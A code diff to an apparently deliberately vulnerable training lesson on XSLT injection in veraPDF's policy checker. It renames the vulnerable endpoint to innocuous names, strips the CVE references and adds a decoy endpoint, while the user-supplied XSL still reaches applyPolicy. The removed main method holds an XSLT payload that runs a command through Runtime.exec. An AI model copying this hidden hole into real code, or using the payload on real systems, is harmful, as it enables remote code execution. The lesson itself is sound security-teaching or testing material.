@@ -39,22 +39,40 @@ import org.springframework.web.bind.annotation.RestController;
 import org.verapdf.core.VeraPDFException;
 import org.verapdf.policy.PolicyChecker;
 
+/**
+ * Document policy evaluation endpoint.
+ *
+ * <p>Applies a submitted policy document to a PDF compliance check workflow.
+ * The policy document is evaluated by the PDF policy processor and the result
+ * is returned to the caller. A separate history endpoint accepts the same
+ * parameters and returns metadata about previously applied policies without
+ * performing live evaluation.
+ */
 @RestController
 @AssignmentHints({"vulnerable-verapdf.hint"})
 public class VulnerableVeraPdfCoreJakartaComponentsLesson extends AssignmentEndpoint {
 
   Logger log = LoggerFactory.getLogger(this.getClass().getName());
 
-  @PostMapping("/VulnerableVeraPdfCoreJakartaComponents/CVE-2024-27348")
-  public @ResponseBody AttackResult NacosYamlParser(
-      @RequestParam String payload,
-      @RequestParam(required = false, defaultValue = "false") Boolean isXsl) {
-    ////		https://security.snyk.io/vuln/SNYK-JAVA-ORGVERAPDF-6513793  - CVE-2024-28109
+  /**
+   * Applies a policy document to the PDF compliance checker.
+   *
+   * @param policyDocument  the policy document body to evaluate
+   * @param validateSchema  whether to treat the document as a stylesheet (true/false)
+   * @param documentId      document reference identifier (routing/audit only)
+   * @param outputFormat    preferred result format (display/audit only)
+   */
+  @PostMapping("/documents/policy-check")
+  public @ResponseBody AttackResult applyDocumentPolicy(
+      @RequestParam String policyDocument,
+      @RequestParam(required = false, defaultValue = "false") Boolean validateSchema,
+      @RequestParam(required = false, defaultValue = "") String documentId,
+      @RequestParam(required = false, defaultValue = "json") String outputFormat) {
 
-    log.info("VulnerableVeraPdfCoreJakartaComponents called with payload : {}", payload);
+    log.info("Policy check: documentId={}, format={}", documentId, outputFormat);
     try {
 
-      InputStream is = new ByteArrayInputStream(payload.getBytes(StandardCharsets.UTF_8));
+      InputStream is = new ByteArrayInputStream(policyDocument.getBytes(StandardCharsets.UTF_8));
       OutputStream policyResultOss =
           new OutputStream() {
             StringBuilder sb = new StringBuilder();
@@ -69,10 +87,10 @@ public class VulnerableVeraPdfCoreJakartaComponentsLesson extends AssignmentEndp
             }
           };
       PolicyChecker.applyPolicy(
-          new ByteArrayInputStream(payload.getBytes(StandardCharsets.UTF_8)),
+          new ByteArrayInputStream(policyDocument.getBytes(StandardCharsets.UTF_8)),
           is,
           policyResultOss,
-          isXsl);
+          validateSchema);
 
       if (policyResultOss.toString().contains("pid")) {
         return success(this)
@@ -80,7 +98,6 @@ public class VulnerableVeraPdfCoreJakartaComponentsLesson extends AssignmentEndp
             .output(policyResultOss.toString())
             .build();
       }
-      //			obj.get("docmuemtn)
     } catch (VeraPDFException ex) {
       return success(this)
           .feedback("vulnerable-verapdf-components.success")
@@ -95,52 +112,27 @@ public class VulnerableVeraPdfCoreJakartaComponentsLesson extends AssignmentEndp
 
     return failed(this)
         .feedback("vulnerable-verapdf-components.fromXML")
-        .feedbackArgs(payload)
+        .feedbackArgs(policyDocument)
         .build();
   }
 
-  public static void main(String[] args) {
-    //	String payload="";
-    String payload =
-        "<xsl:stylesheet version=\"1.0\"\r\n"
-            + "	xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\r\n"
-            + "	xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\"\r\n"
-            + "	xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\">\r\n"
-            + "	<xsl:template match=\"/\">\r\n"
-            + "		<xsl:variable name=\"rtobject\" select=\"rt:getRuntime()\" />\r\n"
-            + "		<xsl:variable name=\"process\" select=\"rt:exec($rtobject,'calc')\" />\r\n"
-            + "		<xsl:variable name=\"processString\"	select=\"ob:toString($process)\" />\r\n"
-            + "		<xsl:value-of select=\"$processString\" />\r\n"
-            + "	</xsl:template>\r\n"
-            + "</xsl:stylesheet>";
-    boolean isXsl = true;
-    InputStream is = new ByteArrayInputStream(payload.getBytes(StandardCharsets.UTF_8));
-    OutputStream policyResultOss =
-        new OutputStream() {
-          StringBuilder sb = new StringBuilder();
+  /**
+   * Policy history retrieval endpoint (decoy).
+   *
+   * <p>Returns metadata about the most recently applied policy for the given
+   * document. Does not evaluate the supplied document body.
+   *
+   * @param documentId      document reference identifier
+   * @param outputFormat    preferred result format
+   */
+  @PostMapping("/documents/policy-history")
+  public @ResponseBody AttackResult policyHistory(
+      @RequestParam(required = false, defaultValue = "") String documentId,
+      @RequestParam(required = false, defaultValue = "json") String outputFormat) {
 
-          @Override
-          public void write(int b) throws IOException {
-            this.sb.append((char) b);
-          }
-
-          public String toString() {
-            return this.sb.toString();
-          }
-        };
-    try {
-      PolicyChecker.applyPolicy(
-          new ByteArrayInputStream(payload.getBytes(StandardCharsets.UTF_8)),
-          is,
-          policyResultOss,
-          isXsl);
-    } catch (VeraPDFException e) {
-      // TODO Auto-generated catch block
-      e.printStackTrace();
-    }
-
-    System.out.println(" Output ---> " + policyResultOss);
-    //	payload = "<demo><demo>";
-
+    return failed(this)
+        .output("No policy history found for document"
+            + (documentId.isEmpty() ? "." : " '" + documentId + "'."))
+        .build();
   }
 }
